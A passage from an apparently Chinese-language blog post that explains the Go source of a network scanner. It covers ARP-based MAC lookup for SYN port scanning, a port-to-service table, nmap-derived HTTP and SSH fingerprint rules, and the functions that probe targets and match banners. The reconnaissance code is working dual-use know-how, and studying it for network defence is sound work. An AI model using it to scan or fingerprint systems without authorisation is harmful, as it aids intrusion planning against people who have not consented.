class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ss *SynScanner)</span></span> getHwAddrV4(arpDst net.IP) (mac net.HardwareAddr, err <span class="hljs-type">error</span>) &#123;<br>ipStr := arpDst.String()<br><span class="hljs-keyword">if</span> ss.watchMacCacheT.IsNeedWatch(ipStr) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;arp of this ip has been in monitoring&quot;</span>)<br>&#125;<br>    <span class="hljs-comment">// 添加到 MAC 监视表中 构造 ARP 请求包 </span><br>ss.watchMacCacheT.UpdateLastTime(ipStr) <span class="hljs-comment">// New one ip watch</span><br>eth := layers.Ethernet&#123;<br>SrcMAC:       ss.srcMac,<br>DstMAC:       net.HardwareAddr&#123;<span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>&#125;,<br>EthernetType: layers.EthernetTypeARP,<br>&#125;<br>arp := layers.ARP&#123;<br>AddrType:          layers.LinkTypeEthernet,<br>Protocol:          layers.EthernetTypeIPv4,<br>HwAddressSize:     <span class="hljs-number">6</span>,<br>ProtAddressSize:   <span class="hljs-number">4</span>,<br>Operation:         layers.ARPRequest,<br>SourceHwAddress:   []<span class="hljs-type">byte</span>(ss.srcMac),<br>SourceProtAddress: []<span class="hljs-type">byte</span>(ss.srcIp),<br>DstHwAddress:      []<span class="hljs-type">byte</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>DstProtAddress:    []<span class="hljs-type">byte</span>(arpDst),<br>&#125;<br>    <span class="hljs-comment">// 发包</span><br><span class="hljs-keyword">if</span> err = ss.sendArp(&amp;eth, &amp;arp); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>start := time.Now()<br><span class="hljs-keyword">var</span> retry <span class="hljs-type">int</span><br>    <span class="hljs-comment">// MAC监视表获取</span><br><span class="hljs-keyword">for</span> &#123;<br>mac = ss.watchMacCacheT.GetMac(ipStr)<br><span class="hljs-keyword">if</span> mac != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> mac, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Wait 600 ms for an ARP reply.</span><br><span class="hljs-keyword">if</span> time.Since(start) &gt; time.Millisecond*<span class="hljs-number">600</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;timeout getting ARP reply&quot;</span>)<br>&#125;<br>retry += <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> retry%<span class="hljs-number">25</span> == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">if</span> err = ss.send(&amp;eth, &amp;arp); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>time.Sleep(time.Millisecond * <span class="hljs-number">10</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>整体的 SYN 端口扫描看完了，其主要流程：</p><ol><li>获取设备基础信息 &#x3D;&gt; 源 MAC、IP ….</li><li>启动监听协程<ol><li>ARP &#x3D;&gt; 添加到 ARP 表中</li><li>ACK &#x3D;&gt; 先判断端口范围，再判断是否在 IP 监视表中是否超时等待，再去获取开放端口，然后就是响应 RST 报文</li></ol></li><li>发包协程<ol><li>通过 ARP 获取目标 MAC 地址</li><li>构造 SYN 进行发包</li></ol></li></ol><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>指纹识别在 fingerprint 包，先看下端口的指纹识别：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">fingerprint.<span class="hljs-keyword">go</span><span class="hljs-comment">// 端口指纹识别逻辑</span><br>rules.<span class="hljs-keyword">go</span><span class="hljs-comment">// 端口指纹规则</span><br></code></pre></td></tr></table></figure><p>先看下规则的样子，端口的指纹识别和 WEB 的其实差不多，都是通过判断响应中是否有匹配的字段。</p><p>这里是端口默认对应的服务，在端口识别的时候优先判断对应的服务会快很多，而不需要全部规则都判断。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> portServiceOrder = <span class="hljs-keyword">map</span>[<span class="hljs-type">uint16</span>][]<span class="hljs-type">string</span>&#123;<br><span class="hljs-number">21</span>:    &#123;<span class="hljs-string">&quot;ftp&quot;</span>&#125;,<br><span class="hljs-number">22</span>:    &#123;<span class="hljs-string">&quot;ssh&quot;</span>&#125;,<br><span class="hljs-number">80</span>:    &#123;<span class="hljs-string">&quot;http&quot;</span>, <span class="hljs-string">&quot;https&quot;</span>&#125;,<br><span class="hljs-number">443</span>:   &#123;<span class="hljs-string">&quot;https&quot;</span>, <span class="hljs-string">&quot;http&quot;</span>&#125;,<br><span class="hljs-number">445</span>:   &#123;<span class="hljs-string">&quot;smb&quot;</span>&#125;,<br><span class="hljs-number">1035</span>:  &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">1080</span>:  &#123;<span class="hljs-string">&quot;socks5&quot;</span>, <span class="hljs-string">&quot;socks4&quot;</span>&#125;,<br><span class="hljs-number">1081</span>:  &#123;<span class="hljs-string">&quot;socks5&quot;</span>, <span class="hljs-string">&quot;socks4&quot;</span>&#125;,<br><span class="hljs-number">1082</span>:  &#123;<span class="hljs-string">&quot;socks5&quot;</span>, <span class="hljs-string">&quot;socks4&quot;</span>&#125;,<br><span class="hljs-number">1083</span>:  &#123;<span class="hljs-string">&quot;socks5&quot;</span>, <span class="hljs-string">&quot;socks4&quot;</span>&#125;,<br><span class="hljs-number">1433</span>:  &#123;<span class="hljs-string">&quot;sqlserver&quot;</span>&#125;,<br><span class="hljs-number">1521</span>:  &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">1522</span>:  &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">1525</span>:  &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">1526</span>:  &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">1574</span>:  &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">1748</span>:  &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">1754</span>:  &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">3306</span>:  &#123;<span class="hljs-string">&quot;mysql&quot;</span>&#125;,<br><span class="hljs-number">3389</span>:  &#123;<span class="hljs-string">&quot;ms-wbt-server&quot;</span>&#125;,<br><span class="hljs-number">6379</span>:  &#123;<span class="hljs-string">&quot;redis&quot;</span>&#125;,<br><span class="hljs-number">9001</span>:  &#123;<span class="hljs-string">&quot;mongodb&quot;</span>&#125;,<br><span class="hljs-number">11211</span>: &#123;<span class="hljs-string">&quot;memcached&quot;</span>&#125;,<br><span class="hljs-number">14238</span>: &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">27017</span>: &#123;<span class="hljs-string">&quot;mongodb&quot;</span>&#125;,<br><span class="hljs-number">20000</span>: &#123;<span class="hljs-string">&quot;oracle&quot;</span>&#125;,<br><span class="hljs-number">49153</span>: &#123;<span class="hljs-string">&quot;mongodb&quot;</span>&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>端口的规则：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs go">serviceRules[<span class="hljs-string">&quot;http&quot;</span>] = serviceRule&#123;<br>    <span class="hljs-comment">// TLS 加密</span><br>    Tls: <span class="hljs-literal">false</span>,<br>    DataGroup: []ruleData&#123;<br>        &#123;<br>            <span class="hljs-comment">// 发送的数据 =&gt; HTTP 的需要发送一个 HTTP 请求</span><br>            ActionSend,<br>            []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;HEAD / HTTP/1.1\r\nHost: &#123;IP&#125;\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: deflate\r\n\r\n&quot;</span>),<br>            <span class="hljs-literal">nil</span>,<br>        &#125;,<br>        &#123;<br>            <span class="hljs-comment">// 响应流中包含 HTTP/ 则证明就是 HTTP 服务</span><br>            ActionRecv,<br>            []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;HTTP/&quot;</span>),<br>            <span class="hljs-literal">nil</span>,<br>        &#125;,<br>    &#125;,<br>&#125;<br><br>serviceRules[<span class="hljs-string">&quot;ssh&quot;</span>] = serviceRule&#123;<br>    Tls: <span class="hljs-literal">false</span>,<br>    DataGroup: []ruleData&#123;<br>        &#123;<br>            <span class="hljs-comment">// SSH 的规则 如果匹配这些规则就证明是 SSH</span><br>            ActionRecv,<br>            <span class="hljs-literal">nil</span>,<br>            []*regexp.Regexp&#123;<br>                regexp.MustCompile(<span class="hljs-string">`^SSH-([\d.]+)-`</span>),<br>                regexp.MustCompile(<span class="hljs-string">`^SSH-(\d[\d.]+)-`</span>),<br>                regexp.MustCompile(<span class="hljs-string">`^SSH-(\d[\d.]*)-`</span>),<br>                regexp.MustCompile(<span class="hljs-string">`^SSH-2\.0-`</span>),<br>                regexp.MustCompile(<span class="hljs-string">`^SSH-1\.`</span>),<br>            &#125;,<br>        &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看出端口指纹的规则和 WEB 还是有不同之处的，有些协议需要特定的请求才行。</p><p>这些规则来自于 nmap ：<a href="https://raw.githubusercontent.com/nmap/nmap/master/nmap-service-probes">raw.githubusercontent.com&#x2F;nmap&#x2F;nmap&#x2F;master&#x2F;nmap-service-probes</a></p><p>在看看具体是怎么识别的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PortIdentify</span><span class="hljs-params">(network <span class="hljs-type">string</span>, ip net.IP, _port <span class="hljs-type">uint16</span>, dailTimeout time.Duration)</span></span> (serviceName <span class="hljs-type">string</span>, banner []<span class="hljs-type">byte</span>, isDailErr <span class="hljs-type">bool</span>) &#123;<br><span class="hljs-comment">// 记录已经匹配过的规则</span><br>matchedRule := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;)<br><br><span class="hljs-comment">// 记录已经匹配过的服务</span><br>recordMatched := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(s <span class="hljs-type">string</span>)</span></span> &#123;<br>matchedRule[s] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br><span class="hljs-comment">// 检查是否有关联规则，若有，则一并记录</span><br><span class="hljs-keyword">if</span> gf, ok := groupFlows[s]; ok &#123;<br><span class="hljs-keyword">for</span> _, s2 := <span class="hljs-keyword">range</span> gf &#123;<br>matchedRule[s2] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 未知服务类型</span><br>unknown := <span class="hljs-string">&quot;unknown&quot;</span><br><span class="hljs-keyword">var</span> sn <span class="hljs-type">string</span><br><br><span class="hljs-comment">// 优先判断port可能的服务</span><br><span class="hljs-keyword">if</span> serviceNames, ok := portServiceOrder[_port]; ok &#123;<br><span class="hljs-keyword">for</span> _, service := <span class="hljs-keyword">range</span> serviceNames &#123;<br><span class="hljs-comment">// 记录匹配的规则</span><br>recordMatched(service)<br><span class="hljs-comment">// 尝试匹配规则，返回匹配的服务类型、banner和错误信息</span><br>sn, banner, isDailErr = matchRule(network, ip, _port, service, dailTimeout)<br><span class="hljs-comment">// 如果匹配成功，则返回匹配结果</span><br><span class="hljs-keyword">if</span> sn != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> sn, banner, <span class="hljs-literal">false</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> isDailErr &#123; <span class="hljs-comment">// 如果发生了连接错误，则直接返回错误信息</span><br><span class="hljs-keyword">return</span> unknown, banner, isDailErr<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 对于只接收数据的服务类型</span><br>&#123;<br><span class="hljs-keyword">var</span> conn net.Conn<br><span class="hljs-keyword">var</span> n <span class="hljs-type">int</span><br>buf := readBufPool.Get().([]<span class="hljs-type">byte</span>)<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>readBufPool.Put(buf)<br>&#125;()<br>address := fmt.Sprintf(<span class="hljs-string">&quot;%s:%d&quot;</span>, ip, _port)<br><span class="hljs-comment">// 尝试与目标地址建立连接</span><br>conn, _ = net.DialTimeout(network, address, dailTimeout)<br><span class="hljs-keyword">if</span> conn == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> unknown, banner, <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-comment">// 尝试读取数据</span><br>n, _ = read(conn, buf)<br>conn.Close()<br><span class="hljs-comment">// 如果成功读取到数据</span><br><span class="hljs-keyword">if</span> n != <span class="hljs-number">0</span> &#123;<br>banner = buf[:n]<br><span class="hljs-comment">// 对于只接收数据的服务类型，尝试使用已知的规则进行匹配</span><br><span class="hljs-keyword">for</span> _, service := <span class="hljs-keyword">range</span> onlyRecv &#123;<br>_, ok := matchedRule[service]<br><span class="hljs-keyword">if</span> ok &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 尝试匹配规则</span><br><span class="hljs-keyword">for</span> _, rule := <span class="hljs-keyword">range</span> serviceRules[service].DataGroup &#123;<br><span class="hljs-keyword">if</span> matchRuleWhithBuf(buf[:n], ip, _port, rule) &#123;<br><span class="hljs-keyword">return</span> service, banner, <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// 记录已经匹配过的只接收数据的服务类型</span><br><span class="hljs-keyword">for</span> _, service := <span class="hljs-keyword">range</span> onlyRecv &#123;<br>recordMatched(service)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 优先判断Top服务</span><br><span class="hljs-keyword">for</span> _, service := <span class="hljs-keyword">range</span> serviceOrder &#123;<br>_, ok := matchedRule[service]<br><span class="hljs-keyword">if</span> ok &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>recordMatched(service)<br>sn, banner, isDailErr = matchRule(network, ip, _port, service, dailTimeout)<br><span class="hljs-keyword">if</span> sn != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> sn, banner, <span class="hljs-literal">false</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> isDailErr &#123;<br><span class="hljs-keyword">return</span> unknown, banner, <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// other</span><br><span class="hljs-keyword">for</span> service := <span class="hljs-keyword">range</span> serviceRules &#123;<br>_, ok := matchedRule[service]<br><span class="hljs-keyword">if</span> ok &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>sn, banner, isDailErr = matchRule(network, ip, _port, service, dailTimeout)<br><span class="hljs-keyword">if</span> sn != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> sn, banner, <span class="hljs-literal">false</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> isDailErr &#123;<br><span class="hljs-keyword">return</span> unknown, banner, <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 如果没有匹配到服务类型，则返回未知服务类型</span><br><span class="hljs-keyword">return</span> unknown, banner, <span class="hljs-literal">false</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>具体流程：</p><ol><li>先获取该端口的默认服务，然后使用 matchRule 进行服务判断，记录下现在匹配的服务 </li><li>匹配一些不需要发送特定请求的服务，使用 net.DialTimeout 建立连接，匹配哪些服务的规则 记录下现在匹配的服务</li><li>然后去判断 TOP 服务，先看下这个服务之前是否匹配过了，没匹配过的再使用 matchRule 进行服务判断，记录下现在匹配的服务</li><li>到最后就是遍历所有的规则，匹配之前没匹配过的服务了</li></ol><p>它进行服务匹配使用的是 matchRule 具体来看一看，它主要做到就是建立 TCP 连接 然后遍历规则进行判断，需要特定请求的就发送特定的请求，之后使用 matchRuleWhithBuf 函数进行规则匹配。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">matchRule</span><span class="hljs-params">(network <span class="hljs-type">string</span>, ip net.IP, _port <span class="hljs-type">uint16</span>, serviceName <span class="hljs-type">string</span>, dailTimeout time.Duration)</span></span> (serviceNameRet <span class="hljs-type">string</span>, banner []<span class="hljs-type">byte</span>, isDailErr <span class="hljs-type">bool</span>) &#123;<br>    <span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>    <span class="hljs-keyword">var</span> isTls <span class="hljs-type">bool</span><br>    <span class="hljs-keyword">var</span> conn net.Conn<br>    <span class="hljs-keyword">var</span> connTls *tls.Conn<br>    address := fmt.Sprintf(<span class="hljs-string">&quot;%s:%d&quot;</span>, ip, _port)<br><span class="hljs-comment">// 获取服务的规则</span><br>    serviceRule2 := serviceRules[serviceName]<br>    flowsService := groupFlows[serviceName]<br>    <span class="hljs-comment">// 建立连接 加密 或者 不加密</span><br>    <span class="hljs-keyword">if</span> serviceRule2.Tls &#123;<br>        connTls, err = tls.DialWithDialer(&amp;net.Dialer&#123;Timeout: dailTimeout&#125;, network, address, &amp;tls.Config&#123;<br>            InsecureSkipVerify: <span class="hljs-literal">true</span>,<br>            MinVersion:         tls.VersionTLS10,<br>        &#125;)<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            <span class="hljs-keyword">if</span> strings.HasSuffix(err.Error(), ioTimeoutStr) || strings.Contains(err.Error(), refusedStr) &#123;<br>                isDailErr = <span class="hljs-literal">true</span><br>                <span class="hljs-keyword">return</span><br>            &#125;<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-keyword">defer</span> connTls.Close()<br>        isTls = <span class="hljs-literal">true</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        conn, err = net.DialTimeout(network, address, dailTimeout)<br>        <span class="hljs-keyword">if</span> conn == <span class="hljs-literal">nil</span> &#123;<br>            isDailErr = <span class="hljs-literal">true</span><br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-keyword">defer</span> conn.Close()<br>    &#125;<br><br>    buf := readBufPool.Get().([]<span class="hljs-type">byte</span>)<br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        readBufPool.Put(buf)<br>    &#125;()<br><br>    data := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-comment">// 逐个判断</span><br>    <span class="hljs-keyword">for</span> _, rule := <span class="hljs-keyword">range</span> serviceRule2.DataGroup &#123;<br>        <span class="hljs-comment">// 替换一下里面的 &#123;IP&#125; &#123;PORT&#125; 变成现在的</span><br>        <span class="hljs-keyword">if</span> rule.Data != <span class="hljs-literal">nil</span> &#123;<br>            data = bytes.Replace(rule.Data, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;&#123;IP&#125;&quot;</span>), []<span class="hljs-type">byte</span>(ip.String()), <span class="hljs-number">-1</span>)<br>            data = bytes.Replace(data, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;&#123;PORT&#125;&quot;</span>), []<span class="hljs-type">byte</span>(strconv.Itoa(<span class="hljs-type">int</span>(_port))), <span class="hljs-number">-1</span>)<br>        &#125;<br><span class="hljs-comment">// 如果是需要发送特定请求的那种 就去向连接中写入相关的请求数据</span><br>        <span class="hljs-keyword">if</span> rule.Action == ActionSend &#123;<br>            <span class="hljs-keyword">if</span> isTls &#123;<br>                connTls.SetWriteDeadline(time.Now().Add(time.Second))<br>                _, err = connTls.Write(data)<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                conn.SetWriteDeadline(time.Now().Add(time.Second))<br>                _, err = conn.Write(data)<br>            &#125;<br>            <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>                <span class="hljs-comment">// 出错就退出</span><br>                <span class="hljs-keyword">return</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 读取数据</span><br>            <span class="hljs-keyword">var</span> n <span class="hljs-type">int</span><br>            <span class="hljs-keyword">if</span> isTls &#123;<br>                n, err = read(connTls, buf)<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                n, err = read(conn, buf)<br>            &#125;<br>            <span class="hljs-comment">// 出错就退出</span><br>            <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> &#123;<br>                <span class="hljs-keyword">return</span><br>            &#125;<br>            banner = buf[:n]<br>            <span class="hljs-comment">// 对响应的数据进行正则匹配</span><br>            <span class="hljs-keyword">if</span> matchRuleWhithBuf(buf[:n], ip, _port, rule) &#123;<br>                serviceNameRet = serviceName<br>                <span class="hljs-keyword">return</span><br>            &#125;<br>            <span class="hljs-comment">// 可归并的服务规则组</span><br>            <span class="hljs-keyword">for</span> _, s := <span class="hljs-keyword">range</span> flowsService &#123;<br>                <span class="hljs-keyword">for</span> _, rule2 := <span class="hljs-keyword">range</span> serviceRules[s].DataGroup &#123;<br>                    <span class="hljs-keyword">if</span> rule2.Action == ActionSend &#123;<br>                        <span class="hljs-keyword">continue</span><br>                    &#125;<br>                    <span class="hljs-keyword">if</span> matchRuleWhithBuf(buf[:n], ip, _port, rule2) &#123;<br>                        serviceNameRet = s<br>                        <span class="hljs-keyword">return</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>matchRuleWhithBuf 这里对规则替换，对数据转 utf-8 码后进行正则匹配 还有包含</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 